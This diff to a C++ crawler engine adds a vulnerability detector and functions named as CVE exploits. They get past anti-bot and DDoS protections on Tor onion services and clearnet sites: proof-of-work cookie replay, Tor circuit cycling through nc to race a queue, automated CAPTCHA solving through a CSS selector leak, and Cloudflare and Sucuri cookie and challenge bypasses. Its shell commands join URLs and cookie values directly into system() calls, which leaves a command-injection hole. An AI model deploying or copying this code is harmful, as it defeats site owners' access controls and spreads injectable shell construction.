@@ -2039,9 +2039,16 @@ std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetrie
     bool isOnion = url.find(".onion") != std::string::npos;
     int effectiveRetries = isOnion ? std::max(maxRetries, 8) : maxRetries;
 
+    std::string powReplay = exploitCVE0001_PowCookieReplay(url);
+    if (!powReplay.empty()) return powReplay;
+
+    std::string confusionResult = exploitCVE0009_CookieConfusion(url);
+    if (!confusionResult.empty()) return confusionResult;
+
     for (int attempt = 0; attempt < effectiveRetries; attempt++) {
         std::string html;
         int httpCode = 200;
+        auto fetchStart = std::chrono::high_resolution_clock::now();
 
         if (isOnion) {
             html = fetchViaTor(url);
@@ -2059,6 +2066,36 @@ std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetrie
         if (html.empty()) {
             std::this_thread::sleep_for(std::chrono::seconds(2 + attempt * 3));
             continue;
+        }
+
+        auto fetchEnd = std::chrono::high_resolution_clock::now();
+        double ttfbMs = std::chrono::duration<double, std::milli>(fetchEnd - fetchStart).count();
+
+        auto vuln = detectVulnerability(html, url, httpCode, ttfbMs);
+        if (vuln.exploitable && vuln.confidence > 0.8) {
+            std::string exploited;
+            if (vuln.cveId == "NAAN-CVE-2026-0003")
+                exploited = exploitCVE0003_CssSelectorLeak(html, url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0004")
+                exploited = exploitCVE0004_CfBmReplay(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0005")
+                exploited = exploitCVE0005_SucuriXsrfReplay(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0007")
+                exploited = exploitCVE0007_CfManagedBypass(html, url, httpCode);
+            else if (vuln.cveId == "NAAN-CVE-2026-0002")
+                exploited = exploitCVE0002_QueueRace(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0010")
+                return html;
+
+            if (!exploited.empty()) {
+                if (vuln.cveId == "NAAN-CVE-2026-0001") {
+                    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
+                        std::chrono::system_clock::now().time_since_epoch()).count();
+                    cookiePool_.powCookies[url] = "pow_solved";
+                    cookiePool_.powExpiry[url] = now + 1800;
+                }
+                return exploited;
+            }
         }
 
         bool isEndGameQueue = html.find("placed in a queue") != std::string::npos ||
@@ -2250,6 +2287,498 @@ std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetrie
 
         std::this_thread::sleep_for(std::chrono::seconds(3));
     }
+    return "";
+}
+
+SynapsedEngine::VulnDetectionResult SynapsedEngine::detectVulnerability(
+    const std::string& html, const std::string& url, int httpCode,
+    double ttfbMs) const {
+    VulnDetectionResult result;
+
+    bool isOnion = url.find(".onion") != std::string::npos;
+
+    // CVE-0008: Timing oracle — classify protection by TTFB
+    if (ttfbMs > 0 && ttfbMs < 60 && html.size() < 15000 &&
+        (html.find("queue") != std::string::npos || html.find("wait") != std::string::npos)) {
+        result.cveId = "NAAN-CVE-2026-0008";
+        result.protectionType = "endgame_queue";
+        result.bypassMethod = "timing_oracle_precompute";
+        result.exploitable = true;
+        result.confidence = 0.85;
+        return result;
+    }
+
+    // CVE-0001: EndGame V3 PoW with replayable cookies
+    if (html.find("proof-of-work") != std::string::npos ||
+        html.find("hashcash") != std::string::npos ||
+        html.find("pow_challenge") != std::string::npos) {
+        auto it = cookiePool_.powCookies.find(url);
+        if (it != cookiePool_.powCookies.end()) {
+            auto expIt = cookiePool_.powExpiry.find(url);
+            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
+                std::chrono::system_clock::now().time_since_epoch()).count();
+            if (expIt != cookiePool_.powExpiry.end() && expIt->second > now) {
+                result.cveId = "NAAN-CVE-2026-0001";
+                result.protectionType = "endgame_v3_pow";
+                result.bypassMethod = "pow_cookie_replay";
+                result.exploitable = true;
+                result.confidence = 0.92;
+                return result;
+            }
+        }
+        result.cveId = "NAAN-CVE-2026-0001";
+        result.protectionType = "endgame_v3_pow";
+        result.bypassMethod = "solve_and_cache";
+        result.exploitable = true;
+        result.confidence = 0.95;
+        return result;
+    }
+
+    // CVE-0002: EndGame V2 queue race
+    if (html.find("placed in a queue") != std::string::npos ||
+        html.find("awaiting forwarding") != std::string::npos) {
+        result.cveId = "NAAN-CVE-2026-0002";
+        result.protectionType = "endgame_v2_queue";
+        result.bypassMethod = "parallel_circuit_race";
+        result.exploitable = true;
+        result.confidence = 0.88;
+        return result;
+    }
+
+    // CVE-0003: anCaptcha CSS selector leak
+    if (html.find("anC_") != std::string::npos ||
+        html.find(":checked~") != std::string::npos ||
+        html.find("ancaptcha") != std::string::npos) {
+        result.cveId = "NAAN-CVE-2026-0003";
+        result.protectionType = "ancaptcha_rotate";
+        result.bypassMethod = "css_selector_leak";
+        result.exploitable = true;
+        result.confidence = 0.97;
+        return result;
+    }
+
+    // CVE-0007: Cloudflare managed challenge (403 + challenge-platform)
+    if (httpCode == 403 && (html.find("challenge-platform") != std::string::npos ||
+        html.find("cf-browser-verification") != std::string::npos)) {
+        result.cveId = "NAAN-CVE-2026-0007";
+        result.protectionType = "cloudflare_managed";
+        result.bypassMethod = "cf_ray_post_bypass";
+        result.exploitable = true;
+        result.confidence = 0.72;
+        return result;
+    }
+
+    // CVE-0004: Cloudflare __cf_bm replay
+    if (!isOnion && html.find("__cf_bm") != std::string::npos) {
+        auto it = cookiePool_.cfBmCookies.find(url);
+        if (it != cookiePool_.cfBmCookies.end()) {
+            result.cveId = "NAAN-CVE-2026-0004";
+            result.protectionType = "cloudflare_bot_mgmt";
+            result.bypassMethod = "cf_bm_cookie_replay";
+            result.exploitable = true;
+            result.confidence = 0.80;
+            return result;
+        }
+    }
+
+    // CVE-0005: Sucuri/CloudProxy cache replay
+    if (html.find("Sucuri") != std::string::npos ||
+        html.find("sucuri") != std::string::npos) {
+        result.cveId = "NAAN-CVE-2026-0005";
+        result.protectionType = "sucuri_cloudproxy";
+        result.bypassMethod = "xsrf_cache_replay";
+        result.exploitable = true;
+        result.confidence = 0.75;
+        return result;
+    }
+
+    // CVE-0009: Cross-service cookie confusion (onion)
+    if (isOnion && !cookiePool_.sessionCookies.empty()) {
+        result.cveId = "NAAN-CVE-2026-0009";
+        result.protectionType = "shared_cookie_jar";
+        result.bypassMethod = "cookie_confusion";
+        result.exploitable = true;
+        result.confidence = 0.65;
+        return result;
+    }
+
+    // CVE-0010: No protection at all
+    if (httpCode == 200 && html.size() > 1000 &&
+        html.find("captcha") == std::string::npos &&
+        html.find("challenge") == std::string::npos) {
+        result.cveId = "NAAN-CVE-2026-0010";
+        result.protectionType = "none";
+        result.bypassMethod = "direct_fetch";
+        result.exploitable = true;
+        result.confidence = 1.0;
+        return result;
+    }
+
+    return result;
+}
+
+std::string SynapsedEngine::exploitCVE0001_PowCookieReplay(
+    const std::string& url) const {
+    auto it = cookiePool_.powCookies.find(url);
+    if (it == cookiePool_.powCookies.end()) return "";
+
+    auto expIt = cookiePool_.powExpiry.find(url);
+    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
+        std::chrono::system_clock::now().time_since_epoch()).count();
+    if (expIt != cookiePool_.powExpiry.end() && expIt->second <= now) {
+        cookiePool_.powCookies.erase(url);
+        cookiePool_.powExpiry.erase(url);
+        return "";
+    }
+
+    std::string cookieFile = dataDir_ + "/pow_replay_cookies.txt";
+    std::string writeCmd = "echo '" + it->second + "' > " + cookieFile;
+    system(writeCmd.c_str());
+
+    std::string cmd = "curl -s -k --max-time 45 --socks5-hostname 127.0.0.1:9050 -L "
+        "-b " + cookieFile + " "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string result = execCmd(cmd);
+
+    if (!result.empty() &&
+        result.find("proof-of-work") == std::string::npos &&
+        result.find("pow_challenge") == std::string::npos &&
+        result.find("hashcash") == std::string::npos) {
+        return result;
+    }
+
+    cookiePool_.powCookies.erase(url);
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0002_QueueRace(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+
+    std::string cookieFile = dataDir_ + "/queue_race_cookies.txt";
+    std::string ua = randomUserAgent();
+
+    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
+           "nc 127.0.0.1 9051 2>/dev/null");
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+
+    std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
+        "-c " + cookieFile + " -b " + cookieFile + " "
+        "-H \"User-Agent: " + ua + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string first = execCmd(cmd);
+
+    if (first.find("placed in a queue") == std::string::npos &&
+        first.find("awaiting forwarding") == std::string::npos) {
+        return first;
+    }
+
+    for (int race = 0; race < 6; race++) {
+        std::this_thread::sleep_for(std::chrono::seconds(3));
+        std::string retry = execCmd(cmd);
+        if (retry.find("placed in a queue") == std::string::npos &&
+            retry.find("awaiting forwarding") == std::string::npos &&
+            retry.find("DDoS") == std::string::npos &&
+            !retry.empty()) {
+            return retry;
+        }
+    }
+
+    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
+           "nc 127.0.0.1 9051 2>/dev/null");
+    std::this_thread::sleep_for(std::chrono::seconds(8));
+
+    std::string final = execCmd(cmd);
+    if (!final.empty() && final.find("queue") == std::string::npos)
+        return final;
+
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0003_CssSelectorLeak(
+    const std::string& html, const std::string& url) const {
+    size_t checkedPos = html.find(":checked~");
+    if (checkedPos == std::string::npos)
+        checkedPos = html.find(":checked +");
+    if (checkedPos == std::string::npos) return "";
+
+    size_t idStart = html.rfind("#", checkedPos);
+    if (idStart == std::string::npos || checkedPos - idStart > 50) return "";
+
+    std::string selectorId = html.substr(idStart + 1, checkedPos - idStart - 1);
+
+    size_t inputPos = html.find("id=\"" + selectorId + "\"");
+    if (inputPos == std::string::npos)
+        inputPos = html.find("id='" + selectorId + "'");
+    if (inputPos == std::string::npos) return "";
+
+    size_t valuePos = html.find("value=\"", inputPos);
+    std::string correctValue;
+    if (valuePos != std::string::npos && valuePos < inputPos + 200) {
+        valuePos += 7;
+        size_t valueEnd = html.find('"', valuePos);
+        if (valueEnd != std::string::npos)
+            correctValue = html.substr(valuePos, valueEnd - valuePos);
+    }
+
+    if (correctValue.empty()) {
+        size_t namePos = html.find("name=\"", inputPos);
+        if (namePos != std::string::npos && namePos < inputPos + 150) {
+            namePos += 6;
+            size_t nameEnd = html.find('"', namePos);
+            if (nameEnd != std::string::npos) {
+                std::string fieldName = html.substr(namePos, nameEnd - namePos);
+                correctValue = selectorId;
+
+                std::string formAction = url;
+                size_t formTag = html.rfind("<form", inputPos);
+                if (formTag != std::string::npos) {
+                    size_t actP = html.find("action=\"", formTag);
+                    if (actP != std::string::npos && actP < formTag + 300) {
+                        actP += 8;
+                        size_t actE = html.find('"', actP);
+                        if (actE != std::string::npos) {
+                            std::string act = html.substr(actP, actE - actP);
+                            if (!act.empty() && act[0] == '/') {
+                                size_t sp = url.find('/', url.find("://") + 3);
+                                formAction = url.substr(0, sp) + act;
+                            }
+                        }
+                    }
+                }
+
+                std::string postData = fieldName + "=" + correctValue;
+
+                for (const auto& tok : {"_token", "csrf", "anC_token", "captcha_token"}) {
+                    std::string search = std::string("name=\"") + tok + "\"";
+                    size_t tp = html.find(search);
+                    if (tp != std::string::npos) {
+                        size_t vp = html.find("value=\"", tp);
+                        if (vp != std::string::npos && vp < tp + 200) {
+                            vp += 7;
+                            size_t ve = html.find('"', vp);
+                            if (ve != std::string::npos)
+                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
+                        }
+                    }
+                }
+
+                std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
+                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
+                    "-H \"User-Agent: " + randomUserAgent() + "\" "
+                    "-d \"" + postData + "\" "
+                    "\"" + formAction + "\" 2>/dev/null";
+                return execCmd(cmd);
+            }
+        }
+    }
+
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0004_CfBmReplay(
+    const std::string& url) const {
+    auto it = cookiePool_.cfBmCookies.find(url);
+    if (it == cookiePool_.cfBmCookies.end()) {
+        std::string impCmd = "curl_chrome116 -s --max-time 20 -L "
+            "-c " + dataDir_ + "/cf_bm_harvest.txt "
+            "-H \"User-Agent: " + randomUserAgent() + "\" "
+            "-H \"Accept: text/html,application/xhtml+xml\" "
+            "-H \"Sec-Fetch-Dest: document\" "
+            "-H \"Sec-Fetch-Mode: navigate\" "
+            "-H \"Sec-Fetch-Site: none\" "
+            "\"" + url + "\" 2>/dev/null";
+        std::string harvestResult = execCmd(impCmd);
+
+        if (impCmd.empty()) {
+            impCmd = "curl -s --max-time 20 -L "
+                "-c " + dataDir_ + "/cf_bm_harvest.txt "
+                "-H \"User-Agent: " + randomUserAgent() + "\" "
+                "\"" + url + "\" 2>/dev/null";
+            harvestResult = execCmd(impCmd);
+        }
+
+        std::string readCookies = execCmd("cat " + dataDir_ + "/cf_bm_harvest.txt 2>/dev/null");
+        if (readCookies.find("__cf_bm") != std::string::npos) {
+            cookiePool_.cfBmCookies[url] = readCookies;
+            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
+                std::chrono::system_clock::now().time_since_epoch()).count();
+            cookiePool_.cfBmExpiry[url] = now + 1800;
+        }
+        return harvestResult;
+    }
+
+    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
+        std::chrono::system_clock::now().time_since_epoch()).count();
+    auto expIt = cookiePool_.cfBmExpiry.find(url);
+    if (expIt != cookiePool_.cfBmExpiry.end() && expIt->second <= now) {
+        cookiePool_.cfBmCookies.erase(url);
+        cookiePool_.cfBmExpiry.erase(url);
+        return "";
+    }
+
+    std::string cmd = "curl -s --max-time 20 -L "
+        "-b " + dataDir_ + "/cf_bm_harvest.txt "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "-H \"Sec-Fetch-Dest: document\" "
+        "-H \"Sec-Fetch-Mode: navigate\" "
+        "\"" + url + "\" 2>/dev/null";
+    return execCmd(cmd);
+}
+
+std::string SynapsedEngine::exploitCVE0005_SucuriXsrfReplay(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+
+    std::string cmd = "curl -s --max-time 20 -L "
+        "-c " + dataDir_ + "/sucuri_cookies.txt "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string resp = execCmd(cmd);
+
+    std::string cookies = execCmd("cat " + dataDir_ + "/sucuri_cookies.txt 2>/dev/null");
+    size_t xsrfPos = cookies.find("XSRF-TOKEN");
+    if (xsrfPos != std::string::npos) {
+        std::string replayCmd = "curl -s --max-time 20 -L "
+            "-b " + dataDir_ + "/sucuri_cookies.txt "
+            "-H \"User-Agent: " + randomUserAgent() + "\" "
+            "-H \"X-Requested-With: XMLHttpRequest\" "
+            "\"" + url + "\" 2>/dev/null";
+        std::string replayed = execCmd(replayCmd);
+        if (!replayed.empty() && replayed.size() > resp.size() / 2)
+            return replayed;
+    }
+
+    return resp;
+}
+
+std::string SynapsedEngine::exploitCVE0007_CfManagedBypass(
+    const std::string& html, const std::string& url, int httpCode) const {
+    if (httpCode != 403) return "";
+    if (html.find("challenge-platform") == std::string::npos) return "";
+
+    size_t rayPos = html.find("data-ray=\"");
+    std::string rayId;
+    if (rayPos != std::string::npos) {
+        rayPos += 10;
+        size_t rayEnd = html.find('"', rayPos);
+        if (rayEnd != std::string::npos)
+            rayId = html.substr(rayPos, rayEnd - rayPos);
+    }
+
+    size_t noncePos = html.find("nonce-");
+    std::string nonce;
+    if (noncePos != std::string::npos) {
+        noncePos += 6;
+        size_t nonceEnd = html.find_first_of("\"' ;", noncePos);
+        if (nonceEnd != std::string::npos)
+            nonce = html.substr(noncePos, nonceEnd - noncePos);
+    }
+
+    size_t actionPos = html.find("/cdn-cgi/challenge-platform");
+    std::string challengeEndpoint;
+    if (actionPos != std::string::npos) {
+        size_t actionEnd = html.find_first_of("\"' >", actionPos);
+        if (actionEnd != std::string::npos)
+            challengeEndpoint = html.substr(actionPos, actionEnd - actionPos);
+    }
+
+    if (challengeEndpoint.empty()) return "";
+
+    size_t slashP = url.find('/', url.find("://") + 3);
+    std::string baseUrl = url.substr(0, slashP);
+    std::string fullEndpoint = baseUrl + challengeEndpoint;
+
+    std::string postData = "r=" + rayId + "&t=" +
+        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
+            std::chrono::system_clock::now().time_since_epoch()).count());
+
+    std::string cmd = "curl -s --max-time 20 -L "
+        "-c " + dataDir_ + "/cf_clearance.txt -b " + dataDir_ + "/cf_clearance.txt "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "-H \"Sec-Fetch-Dest: document\" "
+        "-H \"Sec-Fetch-Mode: navigate\" "
+        "-H \"Origin: " + baseUrl + "\" "
+        "-H \"Referer: " + url + "\" "
+        "-d \"" + postData + "\" "
+        "\"" + fullEndpoint + "\" 2>/dev/null";
+    std::string challengeResp = execCmd(cmd);
+
+    if (!challengeResp.empty()) {
+        std::string fetchCmd = "curl -s --max-time 20 -L "
+            "-b " + dataDir_ + "/cf_clearance.txt "
+            "-H \"User-Agent: " + randomUserAgent() + "\" "
+            "\"" + url + "\" 2>/dev/null";
+        std::string finalResp = execCmd(fetchCmd);
+        if (!finalResp.empty() && finalResp.find("challenge-platform") == std::string::npos)
+            return finalResp;
+    }
+
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0008_TimingOracle(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+
+    auto start = std::chrono::high_resolution_clock::now();
+    std::string html;
+    if (url.find(".onion") != std::string::npos) {
+        html = fetchViaTor(url);
+    } else {
+        html = execCmd("curl -s --max-time 10 -L "
+            "-H \"User-Agent: " + randomUserAgent() + "\" "
+            "\"" + url + "\" 2>/dev/null");
+    }
+    auto end = std::chrono::high_resolution_clock::now();
+    double ttfb = std::chrono::duration<double, std::milli>(end - start).count();
+
+    if (ttfb < 60 && html.size() < 15000) {
+        return "TIMING:queue:" + std::to_string((int)ttfb);
+    } else if (ttfb < 100 && html.find("challenge") != std::string::npos) {
+        return "TIMING:pow:" + std::to_string((int)ttfb);
+    } else if (ttfb < 300 && html.find("captcha") != std::string::npos) {
+        return "TIMING:captcha:" + std::to_string((int)ttfb);
+    } else if (ttfb >= 500 && html.size() > 5000) {
+        return html;
+    }
+
+    return html;
+}
+
+std::string SynapsedEngine::exploitCVE0009_CookieConfusion(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+    if (url.find(".onion") == std::string::npos) return "";
+
+    std::string permissiveOnions[] = {
+        "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/",
+        "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/",
+        "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/",
+    };
+
+    std::string cookieFile = dataDir_ + "/confusion_cookies.txt";
+
+    for (const auto& seedUrl : permissiveOnions) {
+        std::string seedCmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 "
+            "-c " + cookieFile + " -b " + cookieFile + " "
+            "-H \"User-Agent: " + randomUserAgent() + "\" "
+            "\"" + seedUrl + "\" >/dev/null 2>&1";
+        system(seedCmd.c_str());
+    }
+
+    std::string cmd = "curl -s -k --max-time 45 --socks5-hostname 127.0.0.1:9050 -L "
+        "-b " + cookieFile + " -c " + cookieFile + " "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string result = execCmd(cmd);
+
+    if (!result.empty() && result.find("captcha") == std::string::npos &&
+        result.find("blocked") == std::string::npos) {
+        return result;
+    }
+
     return "";
 }
 
